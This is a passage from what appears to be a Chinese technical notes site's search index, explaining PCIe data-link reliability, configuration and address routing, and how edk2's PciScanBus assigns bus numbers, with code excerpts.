DLLP\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u628a\u200b\u76f8\u5e94\u200b\u7684\u200b TLP \u200b\u4ece\u200b retry buffer \u200b\u4e2d\u200b\u5220\u6389\u200b\uff1b\u200b\u5982\u679c\u200b\u6536\u5230\u200b\u4e86\u200b Nak DLLP\uff0c\u200b\u5219\u200b\u8981\u200b\u91cd\u4f20\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b TLP \u200b\u7684\u200b\u53ef\u9760\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0cTLP \u200b\u548c\u200b DLLP \u200b\u7684\u200b\u533a\u522b\u200b\uff1aTLP \u200b\u5c31\u200b\u50cf\u200b IP\uff0c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u8de8\u8d8a\u200b\u591a\u200b\u8df3\u200b\uff1b\u200b\u800c\u200b DLLP \u200b\u662f\u200b\u70b9\u5bf9\u70b9\u200b\u5730\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e00\u4e2a\u200b TLP \u200b\u5728\u200b\u8f6c\u53d1\u200b\u7684\u200b\u6bcf\u200b\u4e00\u200b\u8df3\u200b\u4e2d\u200b\uff0c\u200b\u63a5\u53d7\u65b9\u200b\u90fd\u200b\u4f1a\u200b\u53d1\u9001\u200b\u4e00\u6b21\u200b Ack DLLP\u3002</p> <p>Data Link Layer \u200b\u7684\u200b\u6d41\u91cf\u200b\u662f\u200b Credit-based \u200b\u7684\u200b\uff1a\u200b\u63a5\u53d7\u65b9\u200b\u4f1a\u200b\u544a\u8bc9\u200b\u53d1\u9001\u200b\u65b9\u200b\u81ea\u5df1\u200b\u7684\u200b Buffer \u200b\u8fd8\u6709\u200b\u591a\u5c11\u200b\u7a7a\u95f4\u200b\uff08Credit\uff09\uff0c\u200b\u7136\u540e\u200b\u53d1\u9001\u200b\u65b9\u200b\u6839\u636e\u200b Credit \u200b\u6765\u200b\u63a7\u5236\u200b\u662f\u5426\u200b\u7ee7\u7eed\u200b\u53d1\u9001\u200b TLP\u3002</p>"},{"location":"hardware/pcie.html#_2","title":"\u914d\u7f6e","text":"<p>\u200b\u63a5\u89e6\u200b PCIe \u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7591\u60d1\u200b\uff0c\u200b\u5c31\u662f\u200b\u8fd9\u4e9b\u200b Bus Device Function \u200b\u90fd\u200b\u662f\u200b\u600e\u4e48\u200b\u5206\u914d\u200b\u7684\u200b\uff0c\u200b\u5206\u914d\u200b\u5b8c\u200b\u4e4b\u540e\u200b\uff0c\u200b\u8bbf\u95ee\u200b\u8bf7\u6c42\u200b\u53c8\u200b\u662f\u200b\u600e\u4e48\u200b\u8def\u7531\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/pcie.html#_3","title":"\u8def\u7531","text":"<p>\u200b\u9996\u5148\u200b\u56de\u987e\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u4e86\u200b TLP \u200b\u7684\u200b Memory \u200b\u548c\u200b IO \u200b\u662f\u200b\u6839\u636e\u200b\u5730\u5740\u200b\u8def\u7531\u200b\uff0cConfiguration \u200b\u662f\u200b\u6839\u636e\u200b Bus Device Function \u200b\u8def\u7531\u200b\uff0c\u200b\u800c\u200b PCIe \u200b\u5927\u6982\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6811\u5f62\u200b\u7684\u200b\u7ed3\u6784\u200b\uff0c\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u5c31\u662f\u200b PCIe \u200b\u8bbe\u5907\u200b\uff0c\u200b\u975e\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u662f\u200b\u6865\u200b\u6216\u8005\u200b\u4ea4\u6362\u673a\u200b\u3002\u200b\u56de\u60f3\u200b\u4e00\u4e0b\u200b\uff0cIP \u200b\u7684\u200b\u8def\u7531\u200b\u662f\u200b\u6309\u7167\u200b\u6700\u957f\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\uff0c\u200b\u5982\u679c\u200b\u5728\u200b PCIe \u200b\u4e2d\u200b\u8fd8\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53c8\u200b\u592a\u200b\u8fc7\u4e8e\u200b\u590d\u6742\u200b\u4e86\u200b\uff0c\u200b\u6bd5\u7adf\u200b PCIe \u200b\u53ef\u4ee5\u200b\u4eba\u4e3a\u200b\u5730\u200b\u8bbe\u5b9a\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8ba9\u200b\u5730\u5740\u200b\u6ee1\u8db3\u200b\u4e00\u5b9a\u200b\u7684\u200b\u8fde\u7eed\u6027\u200b\u548c\u200b\u5c40\u90e8\u6027\u200b\uff0c\u200b\u8fd9\u6837\u200b\u8def\u7531\u200b\u9009\u62e9\u200b\u5c31\u200b\u975e\u5e38\u7b80\u5355\u200b\u4e86\u200b\u3002</p> <p>\u200b\u89c2\u5bdf\u200b PCIe \u200b\u6807\u51c6\u200b\u4e2d\u200b 7.3.3 Configuration Request Routing Rules\uff0c\u200b\u7ed3\u5408\u200b MindShare \u200b\u7684\u200b\u4e66\u200b\uff0c\u200b\u770b\u200b Root Ports\uff0cSwitches \u200b\u548c\u200b Bridges \u200b\u7684\u200b\u8981\u6c42\u200b\uff0c\u200b\u5c31\u200b\u77e5\u9053\u200b Configuration \u200b\u8bf7\u6c42\u200b\u662f\u200b\u5982\u4f55\u200b\u8def\u7531\u200b\u7684\u200b\uff1a</p> <ul> <li>Configuration \u200b\u8bf7\u6c42\u200b\u53ea\u80fd\u200b\u7531\u200b Host Bridge \u200b\u53d1\u8d77\u200b</li> <li>\u200b\u5982\u679c\u200b Configuration \u200b\u8bf7\u6c42\u200b\u662f\u200b Type0\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u8bf7\u6c42\u200b\u7684\u200b\u76ee\u7684\u200b\u8bbe\u5907\u200b\u5c31\u662f\u200b\u5f53\u524d\u200b\u8bbe\u5907\u200b</li> <li>\u200b\u5982\u679c\u200b Configuration \u200b\u8bf7\u6c42\u200b\u662f\u200b Type1\uff0c<ul> <li>\u200b\u5982\u679c\u200b\u8bf7\u6c42\u200b\u7684\u200b Bus Number \u200b\u7b49\u4e8e\u200b\u67d0\u200b\u4e00\u4e2a\u200b Downstream Port \u200b\u7684\u200b Secondary Bus Number\uff0c\u200b\u5219\u200b\u628a\u200b Configuration \u200b\u8bf7\u6c42\u200b\u8f6c\u6362\u200b\u4e3a\u200b Type0\uff0c\u200b\u7136\u540e\u200b\u53d1\u7ed9\u200b\u8be5\u200b Downstream Port</li> <li>\u200b\u5982\u679c\u200b\u4e0d\u200b\u7b49\u4e8e\u200b\uff0c\u200b\u4f46\u662f\u200b Bus Number \u200b\u5c5e\u4e8e\u200b\u67d0\u200b\u4e00\u4e2a\u200b Downstream Port \u200b\u7684\u200b Secondary Bus Number \u200b\u548c\u200b Subordinate Bus Number \u200b\u4e4b\u95f4\u200b\uff0c\u200b\u5219\u200b\u4e0d\u200b\u4fee\u6539\u200b Configuration \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u53d1\u9001\u7ed9\u200b\u8be5\u200b Downstream Port\u3002</li> </ul> </li> </ul> <p>\u200b\u5982\u679c\u200b\u7c7b\u6bd4\u200b\u4e00\u4e0b\u200b IP\uff0c\u200b\u90a3\u4e48\u200b\u5206\u7ec4\u200b\u5728\u200b\u4e2d\u9014\u200b\u8def\u7531\u5668\u200b\u8f6c\u53d1\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u662f\u200b Type1\uff0cType0 \u200b\u5c31\u662f\u200b\u6700\u540e\u200b\u4e00\u8df3\u200b\u3002\u200b\u8def\u7531\u200b\u5c31\u662f\u200b\u76f4\u63a5\u200b\u6309\u7167\u200b\u51e0\u4e2a\u200b\u4e0d\u200b\u91cd\u5408\u200b\u7684\u200b Bus Number \u200b\u533a\u95f4\u200b\u8fdb\u884c\u200b\u5224\u65ad\u200b\uff0c\u200b\u6ca1\u6709\u200b\u590d\u6742\u200b\u7684\u200b\u6700\u957f\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\u3002\u200b\u4f46\u662f\u200b\u53c8\u200b\u6709\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5982\u679c\u200b\u6309\u7167\u200b Bus \u200b\u8def\u7531\u200b\uff0c\u200b\u90a3\u200b\u540c\u4e00\u4e2a\u200b Bus \u200b\u4e0b\u200b\u4e0d\u540c\u200b\u7684\u200b Device \u200b\u548b\u529e\u200b\uff1f\u200b\u8fd9\u200b\u5c31\u200b\u50cf\u662f\u200b\u4ee5\u592a\u7f51\u200b\uff0c\u200b\u6700\u540e\u200b\u4e00\u8df3\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u540c\u4e00\u4e2a\u200b\u94fe\u8def\u200b\u4e0a\u200b\u6709\u200b\u591a\u4e2a\u200b\u8bbe\u5907\u200b\uff0c\u200b\u90a3\u4e48\u200b\u591a\u4e2a\u200b\u8bbe\u5907\u200b\u90fd\u200b\u80fd\u200b\u6536\u5230\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b Device \u200b\u53f7\u200b\u5224\u65ad\u200b\u662f\u5426\u662f\u200b\u53d1\u7ed9\u200b\u81ea\u5df1\u200b\u7684\u200b\u3002PCI\uff08\u200b\u6ce8\u610f\u200b\u4e0d\u662f\u200b PCIe\uff09\u200b\u603b\u7ebf\u200b\u4e5f\u200b\u7c7b\u4f3c\u200b\u3002\u200b\u968f\u7740\u200b\u901f\u5ea6\u200b\u8d8a\u6765\u8d8a\u200b\u9ad8\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4ea4\u6362\u673a\u200b\uff0c\u200b\u4ee5\u592a\u7f51\u200b\u5df2\u7ecf\u200b\u53d8\u6210\u200b\u4e86\u200b\u70b9\u5bf9\u70b9\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5f88\u5c11\u200b\u89c1\u5230\u200b\u4e00\u4e2a\u200b\u94fe\u8def\u200b\u4e0a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u8bbe\u5907\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e86\u200b\u3002PCIe \u200b\u4e5f\u200b\u4e00\u6837\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6839\u636e\u200b Bus \u200b\u8def\u7531\u200b\u5c31\u200b\u8db3\u591f\u200b\u4e86\u200b\u3002\u200b\u81f3\u4e8e\u200b lspci \u200b\u770b\u5230\u200b\u7684\u200b\u90a3\u4e9b\u200b Device \u200b\u4e0d\u200b\u7b49\u4e8e\u200b 0 \u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c\u200b\u8981\u4e48\u200b\u662f\u200b\u517c\u5bb9\u200b PCI \u200b\u8bbe\u5907\u200b\u7684\u200b\uff0c\u200b\u8981\u4e48\u200b\u662f\u200b\u865a\u62df\u200b\u7684\u200b\uff0c\u200b\u5728\u200b\u8bbe\u5907\u200b\u5185\u90e8\u200b\u8fdb\u884c\u200b\u8def\u7531\u200b\u7684\u200b\uff0c\u200b\u5e76\u200b\u4e0d\u662f\u200b\u771f\u7684\u200b\u6709\u200b\u4e00\u4e2a\u200b PCIe link \u200b\u8fde\u200b\u4e86\u200b\u591a\u4e2a\u200b\u7269\u7406\u200b\u8bbe\u5907\u200b\u3002</p> <p>\u200b\u6240\u4ee5\u200b\u7b80\u5355\u200b\u7406\u89e3\u200b\u4e00\u4e0b\u200b\uff0cPCI \u200b\u603b\u7ebf\u200b\u786e\u5b9e\u200b\u662f\u200b\u4e00\u6761\u200b\u603b\u7ebf\u200b\uff0c\u200b\u4e00\u6761\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u5f88\u591a\u200b\u8bbe\u5907\u200b\u3002\u200b\u800c\u200b PCIe \u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u662f\u200b\u5f88\u591a\u200b\u4e2a\u200b PCI \u200b\u603b\u7ebf\u200b\u8fde\u63a5\u200b\u5728\u200b\u4e00\u8d77\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b Root Complex \u200b\u6216\u8005\u200b Switch \u200b\u5185\u90e8\u200b\u770b\u6210\u200b\u4e00\u4e2a\u200b\u865a\u62df\u200b\u7684\u200b\u6709\u200b\u5f88\u591a\u200b\u8bbe\u5907\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\uff0c\u200b\u800c\u200b PCIe Link \u200b\u53ef\u4ee5\u200b\u770b\u6210\u200b\u662f\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u8bbe\u5907\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\u3002\u200b\u8fd9\u6837\u200b PCIe \u200b\u4ea4\u6362\u673a\u200b\u53ef\u4ee5\u200b\u770b\u6210\u200b\u82e5\u5e72\u4e2a\u200b PCI-PCI Bridge\uff1a</p> <p> </p> PCIe \u200b\u4ea4\u6362\u673a\u200b\u548c\u200b Root Complex \u200b\u5185\u90e8\u200b\u56fe\u89e3\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\uff09 <p>\u200b\u8fd8\u6709\u200b MindShare \u200b\u4e66\u4e2d\u200b\u7684\u200b\u56fe\u200b 3-5:</p> <p> </p> PCIe \u200b\u5b8c\u6574\u200b\u62d3\u6251\u200b\uff08\u200b\u56fe\u6e90\u200b MineShare PCIe 3.0 \u200b\u4e66\u200b\uff09 <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b\u6bcf\u200b\u4e00\u4e2a\u200b Bus \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b PCI \u200b\u603b\u7ebf\u200b\uff0c\u200b\u65e2\u6709\u200b\u5185\u90e8\u200b\u7684\u200b\u865a\u62df\u200b PCI \u200b\u603b\u7ebf\u200b\uff08Bus 0/2/6\uff09\uff0c\u200b\u4e5f\u200b\u6709\u200b PCIe Link \u200b\u5145\u5f53\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\uff08Bus 1/3/4/5/7/8/9\uff09\u3002\u200b\u5728\u200b\u865a\u62df\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\u91cc\u200b\uff0c\u200b\u6bd4\u5982\u200b PCIe Switch\uff0c\u200b\u4e00\u4e2a\u200b Device \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b Downstream Port\uff1b\u200b\u800c\u200b PCIe Link \u200b\u5bf9\u5e94\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\u4e0a\u200b\u5c31\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b Device\u3002\u200b\u7136\u540e\u200b PCIe Switch \u200b\u7684\u200b\u6bcf\u4e2a\u200b Upstream Port \u200b\u548c\u200b Downstream Port \u200b\u91cc\u4f1a\u200b\u8bb0\u5f55\u200b\u4e09\u4e2a\u200b Bus Number\uff1aPrimary(Pri)\uff0cSecondary(Sec) \u200b\u548c\u200b Subordinate(Sub)\u3002Primary \u200b\u6307\u200b\u7684\u200b\u5c31\u662f\u200b\u5b83\u200b\u4e0a\u6e38\u200b\u76f4\u63a5\u200b\u8fde\u63a5\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\u7f16\u53f7\u200b\uff0cSec \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u4e0b\u6e38\u200b\u76f4\u63a5\u200b\u8fde\u63a5\u200b\u7684\u200b PCI \u200b\u603b\u7ebf\u200b\u7f16\u53f7\u200b\uff0cSub \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5b83\u200b\u4e0b\u6e38\u200b\u7684\u200b\u6700\u5927\u200b PCI \u200b\u603b\u7ebf\u200b\u7f16\u53f7\u200b\u3002</p> <p>\u200b\u8fd9\u6837\u200b\uff0c\u200b\u6536\u5230\u200b Type1 \u200b\u7684\u200b\u65f6\u5019\u200b\uff0cSwitch \u200b\u6309\u7167\u200b\u5404\u4e2a\u200b Downstream Port \u200b\u7684\u200b Sec \u200b\u548c\u200b Sub \u200b\u8fdb\u884c\u200b\u5224\u65ad\u200b\uff0c\u200b\u5982\u679c\u200b\u76ee\u6807\u200b Bus Number \u200b\u7b49\u4e8e\u200b Sec\uff0c\u200b\u5c31\u200b\u8f6c\u6362\u200b\u4e3a\u200b Type0 \u200b\u53d1\u51fa\u200b\u53bb\u200b\uff1b\u200b\u5982\u679c\u200b\u5927\u4e8e\u200b Sec\uff0c\u200b\u4f46\u662f\u200b\u5c0f\u4e8e\u200b\u6216\u200b\u7b49\u4e8e\u200b Sub\uff0c\u200b\u5c31\u200b\u539f\u6837\u200b\u53d1\u51fa\u200b\u53bb\u200b\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4ece\u200b Host Bridge \u200b\u5230\u200b\u6bcf\u4e2a\u200b\u8bbe\u5907\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u8fd9\u6837\u200b\u7684\u200b\u65b9\u5f0f\u200b\u4e00\u8def\u200b\u8f6c\u53d1\u200b\u3002</p> <p>\u200b\u65e2\u7136\u200b BDF \u200b\u662f\u200b\u628a\u200b Bus \u200b\u5212\u5206\u200b\u4e3a\u200b\u591a\u4e2a\u200b\u533a\u95f4\u200b\u6765\u200b\u8def\u7531\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b Memory \u200b\u548c\u200b IO \u200b\u8bf7\u6c42\u200b\u4e5f\u200b\u7c7b\u4f3c\u200b\u5730\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u5212\u5206\u200b\uff0c\u200b\u53d8\u6210\u200b\u591a\u4e2a\u200b\u533a\u95f4\u200b\uff0c\u200b\u7136\u540e\u200b\u7528\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u6cd5\u200b\u8fdb\u884c\u200b\u8def\u7531\u200b\u3002</p> <p>\u200b\u8fd9\u4e9b\u200b\u7528\u4e8e\u200b\u8def\u7531\u200b\u7684\u200b\u533a\u95f4\u200b\u4e0a\u200b\u4e0b\u754c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5404\u4e2a\u200b\u7aef\u53e3\u200b\u7684\u200b Type1 Configuration Space \u200b\u4e2d\u200b\u627e\u5230\u200b\uff1a</p> <p> </p> PCIe Type1 Configuration Space\uff08\u200b\u56fe\u6e90\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\uff09 <ul> <li>\u200b\u8def\u7531\u200b Type1 Configuration Request\uff1aPrimary Bus Number, Secondary Bus Number, Subordinate Bus Number<ul> <li><code>Request Bus Number == Secondary Bus Number</code>: Type1 -&gt; Type0</li> <li><code>Secondary Bus Number &lt; Request Bus Number &lt;= Subordinate Bus Number</code>: Type1 -&gt; Type1</li> </ul> </li> <li>\u200b\u8def\u7531\u200b IO Request\uff1a<code>I/O Base &lt;= IO Address &lt;= I/O Limit</code></li> <li>\u200b\u8def\u7531\u200b Prefetchable Memory Request\uff1a<code>Prefetchable Memory Base &lt;= Memory Address &lt;= Prefetchable Memory Limit</code></li> <li>\u200b\u8def\u7531\u200b Non-Prefetchable Memory Request\uff1a<code>Memory Base &lt;= Memory Address &lt;= Memory Limit</code></li> </ul> <p>\u200b\u800c\u200b\u5177\u4f53\u200b\u5230\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u8bbe\u5907\u200b\u4e0a\u200b\uff0c\u200b\u8bbe\u5907\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u82e5\u5e72\u4e2a\u200b BAR\uff08Base Address Register\uff09\uff0c\u200b\u5728\u200b\u679a\u4e3e\u200b\u8bbe\u5907\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u7ed9\u200b BAR \u200b\u5206\u914d\u200b\u5730\u5740\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u8bbe\u5907\u200b\u7684\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u5230\u200b Switch \u200b\u4e0a\u200b\u7684\u200b Base \u200b\u548c\u200b Limit\uff0c\u200b\u7136\u540e\u200b\u4e00\u76f4\u200b\u9012\u5f52\u200b\uff0c\u200b\u4e00\u8def\u200b\u66f4\u65b0\u200b\u5230\u200b Root Complex\u3002\u200b\u8fd9\u6837\u200b\uff0c\u200b\u5c31\u200b\u5b8c\u6210\u200b\u4e86\u200b\u5730\u5740\u200b\u5206\u914d\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u8bf7\u6c42\u200b\u7684\u200b\u8def\u7531\u200b\u3002</p>"},{"location":"hardware/pcie.html#_4","title":"\u5206\u914d","text":"<p>\u200b\u65e2\u7136\u200b\u77e5\u9053\u200b\u4e86\u200b BDF \u200b\u662f\u200b\u5982\u4f55\u200b\u8def\u7531\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b\u63a5\u4e0b\u6765\u200b\u7684\u200b\u95ee\u9898\u200b\u662f\u200b\uff0c\u200b\u600e\u4e48\u200b\u679a\u4e3e\u200b\u8bbe\u5907\u200b\u548c\u200b\u4ea4\u6362\u673a\u200b\uff0c\u200b\u5206\u914d\u200b Bus Number\u3002\u200b\u8fd9\u4e2a\u200b\u4e8b\u60c5\u200b\u5728\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u505a\u200b\uff08\u200b\u4f8b\u5982\u200b UEFI\uff09\uff0cLinux \u200b\u4e2d\u200b\u4e5f\u200b\u6709\u200b\u76f8\u5173\u200b\u7684\u200b\u4ee3\u7801\u200b\u3002\u200b\u4e0b\u9762\u200b\u5c31\u200b\u6765\u200b\u5bf9\u200b\u7740\u200b edk2 \u200b\u7684\u200b\u6e90\u4ee3\u7801\u200b\u6765\u200b\u770b\u770b\u200b\u5b83\u200b\u662f\u200b\u600e\u4e48\u200b\u505a\u200b\u7684\u200b\u3002</p> <p>\u200b\u5728\u200b edk2 \u200b\u4e2d\u200b\uff0c\u200b\u5206\u914d\u200b Bus Number \u200b\u7684\u200b\u6838\u5fc3\u200b\u4ee3\u7801\u200b\u662f\u200b <code>PciScanBus</code> \u200b\u51fd\u6570\u200b\uff1a</p> <pre><code>/**\n  Scan pci bus and assign bus number to the given PCI bus system.\n\n  @param  Bridge           Bridge device instance.\n  @param  StartBusNumber   start point.\n  @param  SubBusNumber     Point to sub bus number.\n  @param  PaddedBusRange   Customized bus number.\n\n  @retval EFI_SUCCESS      Successfully scanned and assigned bus number.\n  @retval other            Some error occurred when scanning pci bus.\n\n  @note   Feature flag PcdPciBusHotplugDeviceSupport determine whether need support hotplug.\n\n**/\nEFI_STATUS\nPciScanBus (\n  IN PCI_IO_DEVICE  *Bridge,\n  IN UINT8          StartBusNumber,\n  OUT UINT8         *SubBusNumber,\n  OUT UINT8         *PaddedBusRange\n  );\n</code></pre> <p>\u200b\u8f93\u5165\u200b\u4e00\u4e2a\u200b\u6865\u200b\u8bbe\u5907\u200b\u548c\u200b\u521d\u59cb\u200b\u7684\u200b Bus Number\uff0c\u200b\u8f93\u51fa\u200b Subordinate Bus Number\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5206\u914d\u200b\u7684\u200b\u6700\u5927\u200b\u7684\u200b Bus Number\uff0c\u200b\u4ee5\u53ca\u200b Padded Bus Range\uff0c\u200b\u4f8b\u5982\u200b\u5982\u679c\u200b\u8981\u200b\u8003\u8651\u200b\u70ed\u63d2\u62d4\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u9884\u7559\u200b\u4e00\u4e9b\u200b Bus Number\u3002\u200b\u5b83\u200b\u5728\u200b <code>PciRootBridgeEnumerator</code> \u200b\u51fd\u6570\u200b\u4e2d\u200b\u88ab\u200b\u8c03\u7528\u200b\uff0c\u200b\u4f20\u5165\u200b\u7684\u200b\u662f\u200b RootBridgeDev\u3002\u200b\u4f60\u200b\u53ef\u80fd\u200b\u4e5f\u200b\u731c\u200b\u5230\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u51fd\u6570\u200b\u53ef\u4ee5\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b\uff0c\u200b\u4ece\u200b Root Bridge \u200b\u5f00\u59cb\u200b\u5f80\u200b\u4e0b\u200b\uff0c\u200b\u9047\u5230\u200b\u65b0\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u7ee7\u7eed\u200b\u9012\u5f52\u200b\uff0c\u200b\u7136\u540e\u200b\u6839\u636e\u200b\u4e0b\u200b\u4e00\u5c42\u200b\u5206\u914d\u200b\u7684\u200b Bus Number \u200b\u6765\u200b\u8ba1\u7b97\u200b\u4e0a\u200b\u4e00\u5c42\u200b\u7684\u200b Subordinate Bus Number\u3002</p> <p><code>PciScanBus</code> \u200b\u9996\u5148\u200b\u679a\u4e3e\u200b\u5f53\u524d\u200b\u6865\u200b\u8bbe\u5907\u200b\u4e0b\u200b\u7684\u200b\u6240\u6709\u200b Device \u200b\u548c\u200b Function\uff0c\u200b\u56e0\u4e3a\u200b\u5f53\u524d\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u5206\u914d\u200b\u4e86\u200b Bus Number\uff0c\u200b\u6240\u4ee5\u200b\u662f\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u5b83\u200b\u4e0b\u9762\u200b\u7684\u200b Device \u200b\u548c\u200b Function \u200b\u7684\u200b\u3002</p> <pre><code>for (Device = 0; Device &lt;= PCI_MAX_DEVICE; Device++) {\n  TempReservedBusNum = 0;\n  for (Func = 0; Func &lt;= PCI_MAX_FUNC; Func++) {\n    //\n    // Check to see whether a pci device is present\n    //\n    Status =\n        PciDevicePresent(PciRootBridgeIo, &amp;Pci, StartBusNumber, Device, Func);\n\n    if (EFI_ERROR(Status) &amp;&amp; (Func == 0)) {\n      //\n      // go to next device if there is no Function 0\n      //\n      break;\n    }\n\n    if (EFI_ERROR(Status)) {\n      continue;\n    }\n\n    //\n    // Get the PCI device information\n    //\n    Status =\n        PciSearchDevice(Bridge, &amp;Pci, StartBusNumber, Device, Func, &amp;PciDevice);\n\n    if (EFI_ERROR(Status)) {\n      continue;\n    }\n\n    PciAddress = EFI_PCI_ADDRESS(StartBusNumber, Device, Func, 0);\n\n    if (IS_PCI_BRIDGE(&amp;Pci) || IS_CARDBUS_BRIDGE(&amp;Pci)) {\n      //\n      // For PPB\n      //\n\n      Status = PciAllocateBusNumber(Bridge, *SubBusNumber, 1, SubBusNumber);\n      if (EFI_ERROR(Status)) {\n        return Status;\n      }\n\n      SecondBus = *SubBusNumber;\n\n      Register = (UINT16)((SecondBus &lt;&lt; 8) | (UINT16)StartBusNumber);\n      Address = EFI_PCI_ADDRESS(StartBusNumber, Device, Func,\n                                PCI_BRIDGE_PRIMARY_BUS_REGISTER_OFFSET);\n\n      Status = PciRootBridgeIo-&gt;Pci.Write(PciRootBridgeIo, EfiPciWidthUint16,\n                                          Address, 1, &amp;Register);\n\n      //\n      // If it is PPB, recursively search down this bridge\n      //\n      if (IS_PCI_BRIDGE(&amp;Pci)) {\n        //\n        // Temporarily initialize SubBusNumber to maximum bus number to ensure\n        // the PCI configuration transaction to go through any PPB\n        //\n        Register = PciGetMaxBusNumber(Bridge);\n        Address = EFI_PCI_ADDRESS(StartBusNumber, Device, Func,\n                                  PCI_BRIDGE_SUBORDINATE_BUS_REGISTER_OFFSET);\n        Status = PciRootBridgeIo-&gt;Pci.Write(PciRootBridgeIo, EfiPciWidthUint8,\n                                            Address, 1, &amp;Register);\n\n        Status = PciScanBus(PciDevice, SecondBus, SubBusNumber, PaddedBusRange);\n        if (EFI_ERROR(Status)) {\n          return Status;\n        }\n      }\n\n      //\n      // Set the current maximum bus number under the PPB\n      //\n      Address = EFI_PCI_ADDRESS(StartBusNumber, Device, Func,\n                                PCI_BRIDGE_SUBORDINATE_BUS_REGISTER_OFFSET);\n\n      Status = PciRootBridgeIo-&gt;Pci.Write(PciRootBridgeIo, EfiPciWidthUint8,\n                                          Address, 1, SubBusNumber);\n    } else {\n      //\n      // It is device. Check PCI IOV for Bus reservation\n      // Go through each function, just reserve the MAX ReservedBusNum for one\n      // device\n      //\n\n      // OMITTED\n    }\n\n    if ((Func == 0) &amp;&amp; !IS_PCI_MULTI_FUNC(&amp;Pci)) {\n      //\n      // Skip sub functions, this is not a multi function device\n      //\n\n      Func = PCI_MAX_FUNC;\n    }\n  }\n}\n</code></pre> 